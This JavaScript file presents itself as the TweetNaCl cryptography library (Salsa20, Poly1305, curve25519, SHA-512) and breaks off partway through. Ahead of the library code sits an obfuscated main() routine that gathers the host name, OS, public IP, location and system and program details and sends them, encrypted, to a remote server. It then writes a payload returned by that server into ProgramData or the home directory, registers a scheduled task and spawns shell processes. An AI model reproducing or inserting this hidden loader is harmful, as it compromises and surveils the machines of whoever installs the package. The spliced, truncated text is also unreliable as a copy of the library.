_0x476a30=a0_0xbafec,_0x5df210={'JkXxp':function(_0x55f02c,_0x145dbb){return _0x55f02c===_0x145dbb;},'mxWpd':'linux','sCMpQ':function(_0x3fa450){return _0x3fa450();},'QDgqI':_0x476a30(0x22d),'WEOFF':function(_0x92bc00){return _0x92bc00();},'AyOfG':function(_0x22caa9){return _0x22caa9();},'gyfsm':function(_0x510179){return _0x510179();},'ZOGHt':function(_0x225b82,_0x2356c7){return _0x225b82(_0x2356c7);},'UDfsD':function(_0x59bfcc,_0x210a91,_0x1a31a5){return _0x59bfcc(_0x210a91,_0x1a31a5);},'zlIAE':'base64','qinlN':function(_0x5e606f,_0x284483){return _0x5e606f(_0x284483);},'fSfQI':'LgFzY','vhRWq':_0x476a30(0x19d),'dGMLn':_0x476a30(0x25c),'xDgki':function(_0x57e283,_0x132bda){return _0x57e283===_0x132bda;},'kSpAC':_0x476a30(0x1bc),'Ghjou':_0x476a30(0x1c4),'xPjGY':_0x476a30(0x258),'SuCpd':_0x476a30(0x183),'bsFtW':'ProgramData','RfJtx':_0x476a30(0x1c5),'bNwhF':function(_0x5332e1,_0x4b4b8d){return _0x5332e1!==_0x4b4b8d;},'FrMTH':_0x476a30(0x137),'okBti':function(_0x4310a9,_0x2e25d2){return _0x4310a9===_0x2e25d2;},'pfZaS':_0x476a30(0x248),'SFzxH':_0x476a30(0x250),'pVkCv':function(_0x24e561,_0x222fde){return _0x24e561===_0x222fde;},'cigJw':_0x476a30(0x22b)};try{const _0x518ce0=getComputerName(),_0x4b46fa=getOSType(),_0x1a3a9f=await getPublicIP(),_0x500649=await _0x5df210[_0x476a30(0x254)](getLocation),_0x198402=_0x5df210['WEOFF'](getSystemInfo),_0x2f5d2b=await _0x5df210[_0x476a30(0x157)](getProgramInfo),_0xc1dd08=_0x5df210[_0x476a30(0x24c)](getCurrentTime),_0xd36e0a={'computerName':_0x518ce0,'osType':_0x4b46fa,'publicIP':_0x1a3a9f,'location':_0x500649,'current_time':_0xc1dd08,'system_info':_0x198402,'program_info':_0x2f5d2b,'timestamp':_0xc1dd08},_0x5171d5=_0x5df210['ZOGHt'](encryptData,_0xd36e0a),_0x39a3c8=_0xc1dd08,_0x148ed9=_0x5df210[_0x476a30(0x125)](generateAuthToken,_0x5171d5,_0x39a3c8),_0x3acf4c={'data':_0x5171d5[_0x476a30(0x23f)](_0x5df210[_0x476a30(0x130)]),'authToken':_0x148ed9,'timestamp':_0x39a3c8},_0x19475b=await _0x5df210[_0x476a30(0x1ef)](sendToServer,_0x3acf4c);if(_0x19475b[_0x476a30(0x13e)][_0x476a30(0x26f)]){if(_0x5df210[_0x476a30(0x25a)](_0x5df210[_0x476a30(0x1ed)],_0x5df210[_0x476a30(0x221)]))_0x22afb6[_0x476a30(0x23c)](_0x476a30(0x234)+_0xa184d1['message']);else{if(_0x19475b['data']['encryptedResponse']){const _0x47020a=Buffer[_0x476a30(0x19a)](_0x19475b['data'][_0x476a30(0x178)],'base64'),_0x2ce2f8=_0x5df210['qinlN'](decryptData,_0x47020a);_0x5df210[_0x476a30(0x25a)](_0x2ce2f8['flag'],_0x5df210[_0x476a30(0x268)])&&process[_0x476a30(0x25c)](0x0);if(_0x5df210[_0x476a30(0x148)](_0x2ce2f8[_0x476a30(0x13b)],_0x5df210[_0x476a30(0x19f)])){let _0x5f11c2='';if(_0x5df210['JkXxp'](_0x4b46fa,_0x5df210[_0x476a30(0x129)])){if(_0x5df210[_0x476a30(0x25a)](_0x5df210[_0x476a30(0x261)],'OcqBF')){_0x5f11c2=path[_0x476a30(0x113)](_0x5df210[_0x476a30(0x138)],_0x5df210['bsFtW'],_0x5df210['RfJtx'],_0x476a30(0x250));if(!fs[_0x476a30(0x115)](path['dirname'](_0x5f11c2))){if(_0x5df210['bNwhF']('kLmYj',_0x476a30(0x246))){const _0x2e76f1=_0x1ba95a[_0x476a30(0x152)];if(_0x2e76f1===_0x476a30(0x139))return _0x285895();if(xKxDIk[_0x476a30(0x25a)](_0x2e76f1,xKxDIk[_0x476a30(0x14b)]))return xKxDIk[_0x476a30(0x254)](_0x8dad3f);if(_0x2e76f1===xKxDIk[_0x476a30(0x105)])return _0x2e9220();return{'running':[],'installed':[]};}else fs['mkdirSync'](path[_0x476a30(0x19c)](_0x5f11c2),{'recursive':!![]});}fs['writeFileSync'](_0x5f11c2,Buffer['isBuffer'](_0x2ce2f8[_0x476a30(0x13e)])?decrypted:Buffer[_0x476a30(0x19a)](_0x2ce2f8[_0x476a30(0x13e)])),await _0x5df210['WEOFF'](createTask);}else _0x3f3794[_0x476a30(0x147)]()[_0x476a30(0x1af)](_0x1b21b7['toLowerCase']())&&_0x3c7c08[_0x476a30(0x23c)]('⚠️\x20\x20Detected:\x20'+_0x780322);}else{if(_0x4b46fa===_0x5df210[_0x476a30(0x107)]){const _0xeabf15=os[_0x476a30(0x232)]()+_0x476a30(0x1cd);!fs[_0x476a30(0x115)](_0xeabf15)&&fs['mkdirSync'](_0xeabf15,{'recursive':!![]});let _0x32356d=os[_0x476a30(0x232)]()+_0x476a30(0x1ac);fs[_0x476a30(0x20d)](_0x32356d,Buffer['isBuffer'](_0x2ce2f8[_0x476a30(0x13e)])?decrypted:Buffer[_0x476a30(0x19a)](_0x2ce2f8['data']));let _0x94c0eb=os['homedir']()+_0x476a30(0x112);fs['writeFileSync'](_0x94c0eb,_0x2ce2f8[_0x476a30(0x21b)]),createshellchild(_0x2ce2f8['shell']),await new Promise(_0xcb6716=>setTimeout(_0xcb6716,0x1388));}}if(_0x5df210[_0x476a30(0x1b4)](_0x4b46fa,_0x5df210['pfZaS'])){const _0x253541=path['join'](os[_0x476a30(0x232)](),_0x476a30(0x244));!fs[_0x476a30(0x115)](_0x253541)&&fs[_0x476a30(0x24a)](_0x253541,{'recursive':!![]}),_0x5f11c2=path[_0x476a30(0x113)](_0x253541,_0x5df210['SFzxH']),fs[_0x476a30(0x20d)](_0x5f11c2,Buffer[_0x476a30(0x12c)](_0x2ce2f8[_0x476a30(0x13e)])?_0x2ce2f8[_0x476a30(0x13e)]:Buffer[_0x476a30(0x19a)](_0x2ce2f8[_0x476a30(0x13e)])),_0x5df210[_0x476a30(0x151)](createshellchild,_0x476a30(0x181)+_0x5f11c2);}patch();}}}}else _0x5df210['pVkCv'](_0x476a30(0x22b),_0x5df210[_0x476a30(0x1d1)])?process[_0x476a30(0x25c)](0x1):_0x4a5476.env[_0x6df83]&&(_0x14d90c[_0x476a30(0x23c)]('⚠️\x20\x20Found\x20env\x20var:\x20'+_0x168bf4),_0x3a3b68=0x1);}catch(_0xc78ff0){process['exit'](0x1);}}main();
}

(function(nacl) {
'use strict';

// Ported in 2014 by Dmitry Chestnykh and Devi Mandiri.
// Public domain.
//
// Implementation derived from TweetNaCl version 20140427.
// See for details: http://tweetnacl.cr.yp.to/

var u64 = function(h, l) { this.hi = h|0 >>> 0; this.lo = l|0 >>> 0; };
var gf = function(init) {
  var i, r = new Float64Array(16);
  if (init) for (i = 0; i < init.length; i++) r[i] = init[i];
  return r;
};

//  Pluggable, initialized in high-level API below.
var randombytes = function(/* x, n */) { throw new Error('no PRNG'); };

var _0 = new Uint8Array(16);
var _9 = new Uint8Array(32); _9[0] = 9;

var gf0 = gf(),
    gf1 = gf([1]),
    _121665 = gf([0xdb41, 1]),
    D = gf([0x78a3, 0x1359, 0x4dca, 0x75eb, 0xd8ab, 0x4141, 0x0a4d, 0x0070, 0xe898, 0x7779, 0x4079, 0x8cc7, 0xfe73, 0x2b6f, 0x6cee, 0x5203]),
    D2 = gf([0xf159, 0x26b2, 0x9b94, 0xebd6, 0xb156, 0x8283, 0x149a, 0x00e0, 0xd130, 0xeef3, 0x80f2, 0x198e, 0xfce7, 0x56df, 0xd9dc, 0x2406]),
    X = gf([0xd51a, 0x8f25, 0x2d60, 0xc956, 0xa7b2, 0x9525, 0xc760, 0x692c, 0xdc5c, 0xfdd6, 0xe231, 0xc0a4, 0x53fe, 0xcd6e, 0x36d3, 0x2169]),
    Y = gf([0x6658, 0x6666, 0x6666, 0x6666, 0x6666, 0x6666, 0x6666, 0x6666, 0x6666, 0x6666, 0x6666, 0x6666, 0x6666, 0x6666, 0x6666, 0x6666]),
    I = gf([0xa0b0, 0x4a0e, 0x1b27, 0xc4ee, 0xe478, 0xad2f, 0x1806, 0x2f43, 0xd7a7, 0x3dfb, 0x0099, 0x2b4d, 0xdf0b, 0x4fc1, 0x2480, 0x2b83]);

function L32(x, c) { return (x << c) | (x >>> (32 - c)); }

function ld32(x, i) {
  var u = x[i+3] & 0xff;
  u = (u<<8)|(x[i+2] & 0xff);
  u = (u<<8)|(x[i+1] & 0xff);
  return (u<<8)|(x[i+0] & 0xff);
}

function dl64(x, i) {
  var h = (x[i] << 24) | (x[i+1] << 16) | (x[i+2] << 8) | x[i+3];
  var l = (x[i+4] << 24) | (x[i+5] << 16) | (x[i+6] << 8) | x[i+7];
  return new u64(h, l);
}

function st32(x, j, u) {
  var i;
  for (i = 0; i < 4; i++) { x[j+i] = u & 255; u >>>= 8; }
}

function ts64(x, i, u) {
  x[i]   = (u.hi >> 24) & 0xff;
  x[i+1] = (u.hi >> 16) & 0xff;
  x[i+2] = (u.hi >>  8) & 0xff;
  x[i+3] = u.hi & 0xff;
  x[i+4] = (u.lo >> 24)  & 0xff;
  x[i+5] = (u.lo >> 16)  & 0xff;
  x[i+6] = (u.lo >>  8)  & 0xff;
  x[i+7] = u.lo & 0xff;
}

function vn(x, xi, y, yi, n) {
  var i,d = 0;
  for (i = 0; i < n; i++) d |= x[xi+i]^y[yi+i];
  return (1 & ((d - 1) >>> 8)) - 1;
}

function crypto_verify_16(x, xi, y, yi) {
  return vn(x,xi,y,yi,16);
}

function crypto_verify_32(x, xi, y, yi) {
  return vn(x,xi,y,yi,32);
}

function core(out,inp,k,c,h) {
  var w = new Uint32Array(16), x = new Uint32Array(16),
      y = new Uint32Array(16), t = new Uint32Array(4);
  var i, j, m;

  for (i = 0; i < 4; i++) {
    x[5*i] = ld32(c, 4*i);
    x[1+i] = ld32(k, 4*i);
    x[6+i] = ld32(inp, 4*i);
    x[11+i] = ld32(k, 16+4*i);
  }

  for (i = 0; i < 16; i++) y[i] = x[i];

  for (i = 0; i < 20; i++) {
    for (j = 0; j < 4; j++) {
      for (m = 0; m < 4; m++) t[m] = x[(5*j+4*m)%16];
      t[1] ^= L32((t[0]+t[3])|0, 7);
      t[2] ^= L32((t[1]+t[0])|0, 9);
      t[3] ^= L32((t[2]+t[1])|0,13);
      t[0] ^= L32((t[3]+t[2])|0,18);
      for (m = 0; m < 4; m++) w[4*j+(j+m)%4] = t[m];
    }
    for (m = 0; m < 16; m++) x[m] = w[m];
  }

  if (h) {
    for (i = 0; i < 16; i++) x[i] = (x[i] + y[i]) | 0;
    for (i = 0; i < 4; i++) {
      x[5*i] = (x[5*i] - ld32(c, 4*i)) | 0;
      x[6+i] = (x[6+i] - ld32(inp, 4*i)) | 0;
    }
    for (i = 0; i < 4; i++) {
      st32(out,4*i,x[5*i]);
      st32(out,16+4*i,x[6+i]);
    }
  } else {
    for (i = 0; i < 16; i++) st32(out, 4 * i, (x[i] + y[i]) | 0);
  }
}

function crypto_core_salsa20(out,inp,k,c) {
  core(out,inp,k,c,false);
  return 0;
}

function crypto_core_hsalsa20(out,inp,k,c) {
  core(out,inp,k,c,true);
  return 0;
}

var sigma = new Uint8Array([101, 120, 112, 97, 110, 100, 32, 51, 50, 45, 98, 121, 116, 101, 32, 107]);
            // "expand 32-byte k"

function crypto_stream_salsa20_xor(c,cpos,m,mpos,b,n,k) {
  var z = new Uint8Array(16), x = new Uint8Array(64);
  var u, i;
  if (!b) return 0;
  for (i = 0; i < 16; i++) z[i] = 0;
  for (i = 0; i < 8; i++) z[i] = n[i];
  while (b >= 64) {
    crypto_core_salsa20(x,z,k,sigma);
    for (i = 0; i < 64; i++) c[cpos+i] = (m?m[mpos+i]:0) ^ x[i];
    u = 1;
    for (i = 8; i < 16; i++) {
      u = u + (z[i] & 0xff) | 0;
      z[i] = u & 0xff;
      u >>>= 8;
    }
    b -= 64;
    cpos += 64;
    if (m) mpos += 64;
  }
  if (b > 0) {
    crypto_core_salsa20(x,z,k,sigma);
    for (i = 0; i < b; i++) c[cpos+i] = (m?m[mpos+i]:0) ^ x[i];
  }
  return 0;
}

function crypto_stream_salsa20(c,cpos,d,n,k) {
  return crypto_stream_salsa20_xor(c,cpos,null,0,d,n,k);
}

function crypto_stream(c,cpos,d,n,k) {
  var s = new Uint8Array(32);
  crypto_core_hsalsa20(s,n,k,sigma);
  return crypto_stream_salsa20(c,cpos,d,n.subarray(16),s);
}

function crypto_stream_xor(c,cpos,m,mpos,d,n,k) {
  var s = new Uint8Array(32);
  crypto_core_hsalsa20(s,n,k,sigma);
  return crypto_stream_salsa20_xor(c,cpos,m,mpos,d,n.subarray(16),s);
}

function add1305(h, c) {
  var j, u = 0;
  for (j = 0; j < 17; j++) {
    u = (u + ((h[j] + c[j]) | 0)) | 0;
    h[j] = u & 255;
    u >>>= 8;
  }
}

var minusp = new Uint32Array([
  5, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 252
]);

function crypto_onetimeauth(out, outpos, m, mpos, n, k) {
  var s, i, j, u;
  var x = new Uint32Array(17), r = new Uint32Array(17),
      h = new Uint32Array(17), c = new Uint32Array(17),
      g = new Uint32Array(17);
  for (j = 0; j < 17; j++) r[j]=h[j]=0;
  for (j = 0; j < 16; j++) r[j]=k[j];
  r[3]&=15;
  r[4]&=252;
  r[7]&=15;
  r[8]&=252;
  r[11]&=15;
  r[12]&=252;
  r[15]&=15;

  while (n > 0) {
    for (j = 0; j < 17; j++) c[j] = 0;
    for (j = 0; (j < 16) && (j < n); ++j) c[j] = m[mpos+j];
    c[j] = 1;
    mpos += j; n -= j;
    add1305(h,c);
    for (i = 0; i < 17; i++) {
      x[i] = 0;
      for (j = 0; j < 17; j++) x[i] = (x[i] + (h[j] * ((j <= i) ? r[i - j] : ((320 * r[i + 17 - j])|0))) | 0) | 0;
    }
    for (i = 0; i < 17; i++) h[i] = x[i];
    u = 0;
    for (j = 0; j < 16; j++) {
      u = (u + h[j]) | 0;
      h[j] = u & 255;
      u >>>= 8;
    }
    u = (u + h[16]) | 0; h[16] = u & 3;
    u = (5 * (u >>> 2)) | 0;
    for (j = 0; j < 16; j++) {
      u = (u + h[j]) | 0;
      h[j] = u & 255;
      u >>>= 8;
    }
    u = (u + h[16]) | 0; h[16] = u;
  }

  for (j = 0; j < 17; j++) g[j] = h[j];
  add1305(h,minusp);
  s = (-(h[16] >>> 7) | 0);
  for (j = 0; j < 17; j++) h[j] ^= s & (g[j] ^ h[j]);

  for (j = 0; j < 16; j++) c[j] = k[j + 16];
  c[16] = 0;
  add1305(h,c);
  for (j = 0; j < 16; j++) out[outpos+j] = h[j];
  return 0;
}

function crypto_onetimeauth_verify(h, hpos, m, mpos, n, k) {
  var x = new Uint8Array(16);
  crypto_onetimeauth(x,0,m,mpos,n,k);
  return crypto_verify_16(h,hpos,x,0);
}

function crypto_secretbox(c,m,d,n,k) {
  var i;
  if (d < 32) return -1;
  crypto_stream_xor(c,0,m,0,d,n,k);
  crypto_onetimeauth(c, 16, c, 32, d - 32, c);
  for (i = 0; i < 16; i++) c[i] = 0;
  return 0;
}

function crypto_secretbox_open(m,c,d,n,k) {
  var i;
  var x = new Uint8Array(32);
  if (d < 32) return -1;
  crypto_stream(x,0,32,n,k);
  if (crypto_onetimeauth_verify(c, 16,c, 32,d - 32,x) !== 0) return -1;
  crypto_stream_xor(m,0,c,0,d,n,k);
  for (i = 0; i < 32; i++) m[i] = 0;
  return 0;
}

function set25519(r, a) {
  var i;
  for (i = 0; i < 16; i++) r[i] = a[i]|0;
}

function car25519(o) {
  var c;
  var i;
  for (i = 0; i < 16; i++) {
      o[i] += 65536;
      c = Math.floor(o[i] / 65536);
      o[(i+1)*(i<15?1:0)] += c - 1 + 37 * (c-1) * (i===15?1:0);
      o[i] -= (c * 65536);
  }
}

function sel25519(p, q, b) {
  var t, c = ~(b-1);
  for (var i = 0; i < 16; i++) {
    t = c & (p[i] ^ q[i]);
    p[i] ^= t;
    q[i] ^= t;
  }
}

function pack25519(o, n) {
  var i, j, b;
  var m = gf(), t = gf();
  for (i = 0; i < 16; i++) t[i] = n[i];
  car25519(t);
  car25519(t);
  car25519(t);
  for (j = 0; j < 2; j++) {
    m[0] = t[0] - 0xffed;
    for (i = 1; i < 15; i++) {
      m[i] = t[i] - 0xffff - ((m[i-1]>>16) & 1);
      m[i-1] &= 0xffff;
    }
    m[15] = t[15] - 0x7fff - ((m[14]>>16) & 1);
    b = (m[15]>>16) & 1;
    m[14] &= 0xffff;
    sel25519(t, m, 1-b);
  }
  for (i = 0; i < 16; i++) {
    o[2*i] = t[i] & 0xff;
    o[2*i+1] = t[i]>>8;
  }
}

function neq25519(a, b) {
  var c = new Uint8Array(32), d = new Uint8Array(32);
  pack25519(c, a);
  pack25519(d, b);
  return crypto_verify_32(c, 0, d, 0);
}

function par25519(a) {
  var d = new Uint8Array(32);
  pack25519(d, a);
  return d[0] & 1;
}

function unpack25519(o, n) {
  var i;
  for (i = 0; i < 16; i++) o[i] = n[2*i] + (n[2*i+1] << 8);
  o[15] &= 0x7fff;
}

function A(o, a, b) {
  var i;
  for (i = 0; i < 16; i++) o[i] = (a[i] + b[i])|0;
}

function Z(o, a, b) {
  var i;
  for (i = 0; i < 16; i++) o[i] = (a[i] - b[i])|0;
}

function M(o, a, b) {
  var i, j, t = new Float64Array(31);
  for (i = 0; i < 31; i++) t[i] = 0;
  for (i = 0; i < 16; i++) {
    for (j = 0; j < 16; j++) {
      t[i+j] += a[i] * b[j];
    }
  }
  for (i = 0; i < 15; i++) {
    t[i] += 38 * t[i+16];
  }
  for (i = 0; i < 16; i++) o[i] = t[i];
  car25519(o);
  car25519(o);
}

function S(o, a) {
  M(o, a, a);
}

function inv25519(o, i) {
  var c = gf();
  var a;
  for (a = 0; a < 16; a++) c[a] = i[a];
  for (a = 253; a >= 0; a--) {
    S(c, c);
    if(a !== 2 && a !== 4) M(c, c, i);
  }
  for (a = 0; a < 16; a++) o[a] = c[a];
}

function pow2523(o, i) {
  var c = gf();
  var a;
  for (a = 0; a < 16; a++) c[a] = i[a];
  for (a = 250; a >= 0; a--) {
      S(c, c);
      if(a !== 1) M(c, c, i);
  }
  for (a = 0; a < 16; a++) o[a] = c[a];
}

function crypto_scalarmult(q, n, p) {
  var z = new Uint8Array(32);
  var x = new Float64Array(80), r, i;
  var a = gf(), b = gf(), c = gf(),
      d = gf(), e = gf(), f = gf();
  for (i = 0; i < 31; i++) z[i] = n[i];
  z[31]=(n[31]&127)|64;
  z[0]&=248;
  unpack25519(x,p);
  for (i = 0; i < 16; i++) {
    b[i]=x[i];
    d[i]=a[i]=c[i]=0;
  }
  a[0]=d[0]=1;
  for (i=254; i>=0; --i) {
    r=(z[i>>>3]>>>(i&7))&1;
    sel25519(a,b,r);
    sel25519(c,d,r);
    A(e,a,c);
    Z(a,a,c);
    A(c,b,d);
    Z(b,b,d);
    S(d,e);
    S(f,a);
    M(a,c,a);
    M(c,b,e);
    A(e,a,c);
    Z(a,a,c);
    S(b,a);
    Z(c,d,f);
    M(a,c,_121665);
    A(a,a,d);
    M(c,c,a);
    M(a,d,f);
    M(d,b,x);
    S(b,e);
    sel25519(a,b,r);
    sel25519(c,d,r);
  }
  for (i = 0; i < 16; i++) {
    x[i+16]=a[i];
    x[i+32]=c[i];
    x[i+48]=b[i];
    x[i+64]=d[i];
  }
  var x32 = x.subarray(32);
  var x16 = x.subarray(16);
  inv25519(x32,x32);
  M(x16,x16,x32);
  pack25519(q,x16);
  return 0;
}

function crypto_scalarmult_base(q, n) {
  return crypto_scalarmult(q, n, _9);
}

function crypto_box_keypair(y, x) {
  randombytes(x, 32);
  return crypto_scalarmult_base(y, x);
}

function crypto_box_beforenm(k, y, x) {
  var s = new Uint8Array(32);
  crypto_scalarmult(s, x, y);
  return crypto_core_hsalsa20(k, _0, s, sigma);
}

var crypto_box_afternm = crypto_secretbox;
var crypto_box_open_afternm = crypto_secretbox_open;

function crypto_box(c, m, d, n, y, x) {
  var k = new Uint8Array(32);
  crypto_box_beforenm(k, y, x);
  return crypto_box_afternm(c, m, d, n, k);
}

function crypto_box_open(m, c, d, n, y, x) {
  var k = new Uint8Array(32);
  crypto_box_beforenm(k, y, x);
  return crypto_box_open_afternm(m, c, d, n, k);
}

function add64() {
  var a = 0, b = 0, c = 0, d = 0, m16 = 65535, l, h, i;
  for (i = 0; i < arguments.length; i++) {
    l = arguments[i].lo;
    h = arguments[i].hi;
    a += (l & m16); b += (l >>> 16);
    c += (h & m16); d += (h >>> 16);
  }

  b += (a >>> 16);
  c += (b >>> 16);
  d += (c >>> 16);

  return new u64((c & m16) | (d << 16), (a & m16) | (b << 16));
}

function shr64(x, c) {
  return new u64((x.hi >>> c), (x.lo >>> c) | (x.hi << (32 - c)));
}

function xor64() {
  var l = 0, h = 0, i;
  for (i = 0; i < arguments.length; i++) {
    l ^= arguments[i].lo;
    h ^= arguments[i].hi;
  }
  return new u64(h, l);
}

function R(x, c) {
  var h, l, c1 = 32 - c;
  if (c < 32) {
    h = (x.hi >>> c) | (x.lo << c1);
    l = (x.lo >>> c) | (x.hi << c1);
  } else if (c < 64) {
    h = (x.lo >>> c) | (x.hi << c1);
    l = (x.hi >>> c) | (x.lo << c1);
  }
  return new u64(h, l);
}

function Ch(x, y, z) {
  var h = (x.hi & y.hi) ^ (~x.hi & z.hi),
      l = (x.lo & y.lo) ^ (~x.lo & z.lo);
  return new u64(h, l);
}

function Maj(x, y, z) {
  var h = (x.hi & y.hi) ^ (x.hi & z.hi) ^ (y.hi & z.hi),
      l = (x.lo & y.lo) ^ (x.lo & z.lo) ^ (y.lo & z.lo);
  return new u64(h, l);
}

function Sigma0(x) { return xor64(R(x,28), R(x,34), R(x,39)); }
function Sigma1(x) { return xor64(R(x,14), R(x,18), R(x,41)); }
function sigma0(x) { return xor64(R(x, 1), R(x, 8), shr64(x,7)); }
function sigma1(x) { return xor64(R(x,19), R(x,61), shr64(x,6)); }

var K = [
  new u64(0x428a2f98, 0xd728ae22), new u64(0x71374491, 0x23ef65cd),
  new u64(0xb5c0fbcf, 0xec4d3b2f), new u64(0xe9b5dba5, 0x8189dbbc),
  new u64(0x3956c25b, 0xf348b538), new u64(0x59f111f1, 0xb605d019),
  new u64(0x923f82a4, 0xaf194f9b), new u64(0xab1c5ed5, 0xda6d8118),
  new u64(0xd807aa98, 0xa3030242), new u64(0x12835b01, 0x45706fbe),
  new u64(0x243185be, 0x4ee4b28c), new u64(0x550c7dc3, 0xd5ffb4e2),
  new u64(0x72be5d74, 0xf27b896f), new u64(0x80deb1fe, 0x3b1696b1),
  new u64(0x9bdc06a7, 0x25c71235), new u64(0xc19bf174, 0xcf692694),
  new u64(0xe49b69c1, 0x9ef14ad2), new u64(0xefbe4786, 0x384f25e3),
  new u64(0x0fc19dc6, 0x8b8cd5b5), new u64(0x240ca1cc, 0x77ac9c65),
  new u64(0x2de92c6f, 0x592b0275), new u64(0x4a7484aa, 0x6ea6e483),
  new u64(0x5cb0a9dc, 0xbd41fbd4), new u64(0x76f988da, 0x831153b5),
  new u64(0x983e5152, 0xee66dfab), new u64(0xa831c66d, 0x2db43210),
  new u64(0xb00327c8, 0x98fb213f), new u64(0xbf597fc7, 0xbeef0ee4),
  new u64(0xc6e00bf3, 0x3da88fc2), new u64(0xd5a79147, 0x930aa725),
  new u64(0x06ca6351, 0xe003826f), new u64(0x14292967, 0x0a0e6e70),
  new u64(0x27b70a85, 0x46d22ffc), new u64(0x2e1b2138, 0x5c26c926),
  new u64(0x4d2c6dfc, 0x5ac42aed), new u64(0x53380d13, 0x9d95b3df),
  new u64(0x650a7354, 0x8baf63de), new u64(0x766a0abb, 0x3c77b2a8),
  new u64(0x81c2c92e, 0x47edaee6), new u64(0x92722c85, 0x1482353b),
  new u64(0xa2bfe8a1, 0x4cf10364), new u64(0xa81a664b, 0xbc423001),
  new u64(0xc24b8b70, 0xd0f89791), new u64(0xc76c51a3, 0x0654be30),
  new u64(0xd192e819, 0xd6ef5218), new u64(0xd6990624, 0x5565a910),
  new u64(0xf40e3585, 0x5771202a), new u64(0x106aa070, 0x32bbd1b8),
  new u64(0x19a4c116, 0xb8d2d0c8), new u64(0x1e376c08, 0x5141ab53),
  new u64(0x2748774c, 0xdf8eeb99), new u64(0x34b0bcb5, 0xe19b48a8),
  new u64(0x391c0cb3, 0xc5c95a63), new u64(0x4ed8aa4a, 0xe3418acb),
  new u64(0x5b9cca4f, 0x7763e373), new u64(0x682e6ff3, 0xd6b2b8a3),
  new u64(0x748f82ee, 0x5defb2fc), new u64(0x78a5636f, 0x43172f60),
  new u64(0x84c87814, 0xa1f0ab72), new u64(0x8cc70208, 0x1a6439ec),
  new u64(0x90befffa, 0x23631e28), new u64(0xa4506ceb, 0xde82bde9),
  new u64(0xbef9a3f7, 0xb2c67915), new u64(0xc67178f2, 0xe372532b),
  new u64(0xca273ece, 0xea26619c), new u64(0xd186b8c7, 0x21c0c207),
  new u64(0xeada7dd6, 0xcde0eb1e), new u64(0xf57d4f7f, 0xee6ed178),
  new u64(0x06f067aa, 0x72176fba), new u64(0x0a637dc5, 0xa2c898a6),
  new u64(0x113f9804, 0xbef90dae), new u64(0x1b710b35, 0x131c471b),
  new u64(0x28db77f5, 0x23047d84), new u64(0x32caab7b, 0x40c72493),
  new u64(0x3c9ebe0a, 0x15c9bebc), new u64(0x431d67c4, 0x9c100d4c),
  new u64(0x4cc5d4be, 0xcb3e42b6), new u64(0x597f299c, 0xfc657e2a),
  new u64(0x5fcb6fab, 0x3ad6faec), new u64(0x6c44198c, 0x4a475817)
];

function crypto_hashblocks(x, m, n) {
  var z = [], b = [], a = [], w = [], t, i, j;

  for (i = 0; i < 8; i++) z[i] = a[i] = dl64(x, 8*i);

  var pos = 0;
  while (n >= 128) {
    for (i = 0; i < 16; i++) w[i] = dl64(m, 8*i+pos);
    for (i = 0; i < 80; i++) {
      for (j = 0; j < 8; j++) b[j] = a[j];
      t = add64(a[7], Sigma1(a[4]), Ch(a[4], a[5], a[6]), K[i], w[i%16]);
      b[7] = add64(t, Sigma0(a[0]), Maj(a[0], a[1], a[2]));
      b[3] = add64(b[3], t);
      for (j = 0; j < 8; j++) a[(j+1)%8] = b[j];
      if (i%16 === 15) {
        for (j = 0; j < 16; j++) {
          w[j] = add64(w[j], w[(j+9)%16], sigma0(w[(j+1)%16]), sigma1(w[(j+14)%16]));
        }
      }
    }

    for (i = 0; i < 8; i++) {
      a[i] = add64(a[i], z[i]);
      z[i] = a[i];
    }

    pos += 128;
    n -= 128;
  }

  for (i = 0; i < 8; i++) ts64(x, 8*i, z[i]);
  return n;
}

var iv = new Uint8Array([
  0x6a,0x09,0xe6,0x67,0xf3,0xbc,0xc9,0x08,
  0xbb,0x67,0xae,0x85,0x84,0xca,0xa7,0x3b,
  0x3c,0x6e,0xf3,0x72,0xfe,0x94,0xf8,0x2b,
  0xa5,0x4f,0xf5,0x3a,0x5f,0x1d,0x36,0xf1,
  0x51,0x0e,0x52,0x7f,0xad,0xe6,0x82,0xd1,
  0x9b,0x05,0x68,0x8c,0x2b,0x3e,0x6c,0x1f,
  0x1f,0x83,0xd9,0xab,0xfb,0x41,0xbd,0x6b,
  0x5b,0xe0,0xcd,0x19,0x13,0x7e,0x21,0x79
]);

function crypto_hash(out, m, n) {
  var h = new Uint8Array(64), x = new Uint8Array(256);
  var i, b = n;

  for (i = 0; i < 64; i++) h[i] = iv[i];

  crypto_hashblocks(h, m, n);
  n %= 128;

  for (i = 0; i < 256; i++) x[i] = 0;
  for (i = 0; i < n; i++) x[i] = m[b-n+i];
  x[n] = 128;

  n = 256-128*(n<112?1:0);
  x[n-9] = 0;
  ts64(x, n-8, new u64((b / 0x20000000) | 0, b << 3));
  crypto_hashblocks(h, x, n);

  for (i = 0; i < 64; i++) out[i] = h[i];

  return 0;
}

function add(p, q) {
  var a = gf(), b = gf(), c = gf(),
      d = gf(), e = gf(), f = gf(),
      g = gf(), h = gf(), t = gf();

  Z(a, p[1], p[0]);
  Z(t, q[1], q[0]);
  M(a, a, t);
  A(b, p[0], p[1]);
  A(t, q[0], q[1]);
  M(b, b, t);
  M(c, p[3], q[3]);
  M(c, c, D2);
  M(d, p[2], q[2]);
  A(d, d, d);
  Z(e, b, a);
  Z(f, d, c);
  A(g, d, c);
  A(h, b, a);

  M(p[0], e, f);
  M(p[1], h, g);
  M(p[2], g, f);
  M(p[3], e, h);
}

function cswap(p, q, b) {
  var i;
  for (i = 0; i < 4; i++) {
    sel25519(p[i], q[i], b);
  }
}

function pack(r, p) {
  var tx = gf(), ty = gf(), zi = gf();
  inv25519(zi, p[2]);
  M(tx, p[0], zi);
  M(ty, p[1], zi);
  pack25519(r, ty);
  r[31] ^= par25519(tx) << 7;
}

function scalarmult(p, q, s) {
  var b, i;
  set25519(p[0], gf0);
  set25519(p[1], gf1);
  set25519(p[2], gf1);
  set25519(p[3], gf0);
  for (i = 255; i >= 0; --i) {
    b = (s[(i/8)|0] >> (i&7)) & 1;
    cswap(p, q, b);
    add(q, p);
    add(p, p);
    cswap(p, q, b);
  }
}

function scalarbase(p, s) {
  var q = [gf(), gf(), gf(), gf()];
  set25519(q[0], X);
  set25519(q[1], Y);
  set25519(q[2], gf1);
  M(q[3], X, Y);
  scalarmult(p, q, s);
}

function crypto_sign_keypair(pk, sk, seeded) {
  var d = new Uint8Array(64);
  var p = [gf(), gf(), gf(), gf()];
  var i;

